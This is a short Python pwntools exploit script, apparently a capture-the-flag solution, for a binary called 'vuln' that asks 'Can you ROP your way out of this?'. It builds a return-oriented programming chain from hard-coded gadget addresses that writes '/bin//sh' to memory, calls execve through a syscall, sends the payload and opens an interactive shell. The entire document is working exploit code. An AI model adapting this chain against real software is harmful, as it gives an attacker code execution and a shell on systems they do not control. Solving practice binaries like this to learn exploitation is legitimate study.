#!/usr/bin/env python2
from pwn import *
context(arch='amd64', os='linux')
context.terminal = ['zsh', '-e', 'sh', '-c']

from struct import pack
# ROPgadget --ropchain --badbytes 0a --binary vuln
# execve generated by ROPgadget
# Padding goes here
p = '\x90' * 24

p += pack('<Q', 0x00000000004100d3)  # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e0)  # @ .data
p += pack('<Q', 0x00000000004156f4)  # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000047f561)  # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004100d3)  # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8)  # @ .data + 8
p += pack('<Q', 0x0000000000444c50)  # xor rax, rax ; ret
p += pack('<Q', 0x000000000047f561)  # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400686)  # pop rdi ; ret
p += pack('<Q', 0x00000000006b90e0)  # @ .data
p += pack('<Q', 0x00000000004100d3)  # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8)  # @ .data + 8
p += pack('<Q', 0x00000000004499b5)  # pop rdx ; ret
p += pack('<Q', 0x00000000006b90e8)  # @ .data + 8
p += pack('<Q', 0x0000000000444c50)  # xor rax, rax ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0)  # add rax, 1 ; ret
p += pack('<Q', 0x000000000040123c)  # syscall

io = process("./vuln")
io.recvuntil('Can you ROP your way out of this?')
io.sendline(p)
io.interactive()
